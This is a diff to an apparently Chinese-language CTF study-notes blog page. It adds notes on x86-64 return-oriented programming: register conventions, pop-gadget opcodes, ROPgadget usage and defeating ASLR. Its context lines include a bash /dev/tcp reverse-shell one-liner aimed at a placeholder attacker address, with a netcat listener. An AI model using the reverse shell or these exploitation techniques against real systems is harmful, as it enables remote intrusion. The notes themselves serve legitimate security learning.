@@ -214,6 +214,31 @@
 
 <p><strong>trick:开启reverse tcp shell(web同时适用)</strong><br>system(“bash -c ‘bash -i &gt;&amp; /dev/tcp/to.your.ip.addr/31337 0&gt;&amp;1’”)</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/31337 0&gt;&amp;1&#x27;&quot;)</span></span><br><span class="line">nc -vlp 31337</span><br></pre></td></tr></table></figure>
+
+<h1 id="ROP-for-x86-64"><a href="#ROP-for-x86-64" class="headerlink" title="ROP for x86-64"></a>ROP for x86-64</h1><p><strong>64-bin ROP</strong></p>
+<ul>
+<li><em>syscall 要用rax,rdi,rsi,rdx,rcx,r8,r9,syscall</em></li>
+<li><em>Function call参数传递适用寄存器而不是栈 rdi,rsi,rdx,rcx,r8,r9</em></li>
+<li><em>需要用pop-ret控制register，再接function address</em></li>
+</ul>
+<p><strong>64-bit register</strong></p>
+<ul>
+<li><em>rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi</em></li>
+<li><em>r8-r15是用前8个加上rex prefix来表示</em></li>
+<li>*r12-r15是callee saved，所以pop r12 - r15在function return前很常见</li>
+<li><em>pop r14 = 415e / pop rsi = 5e</em></li>
+<li><em>pop r15 = 415f / pop rdi = 5f</em></li>
+</ul>
+<p><strong>ROPgadget</strong><br>ROPgadget预设的搜索长度对64位来说可能不太够，需要增加–depth</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./binary --depth 100</span><br></pre></td></tr></table></figure>
+
+<p><strong>通用gadget</strong></p>
+<ul>
+<li><em>64bit rop需要gadget控制参数</em></li>
+<li><em>gcc的程序中有一些片段一定会有，可以用来做rop，构造ret2lib不是问题</em></li>
+</ul>
+<p><img src="w5-x64-rdi-rsi.png" alt="w5-x64-rdi-rsi"><br><img src="w5-x64-rdi.png" alt="w5-x64-rdi"><br><img src="w5-x64-rax.png" alt="w5-x64-rax"><br><img src="w5-x64-rcx.png" alt="w5-x64-rcx"><br><img src="w5-x64-rax2mem.png" alt="w5-x64-rax2mem"></p>
+<p><strong>De-ASLR with ROP</strong><br><em>Calculate Runction Address without Information Leakage</em><br><img src="w5-deaslr.png" alt="w5-deaslr"></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
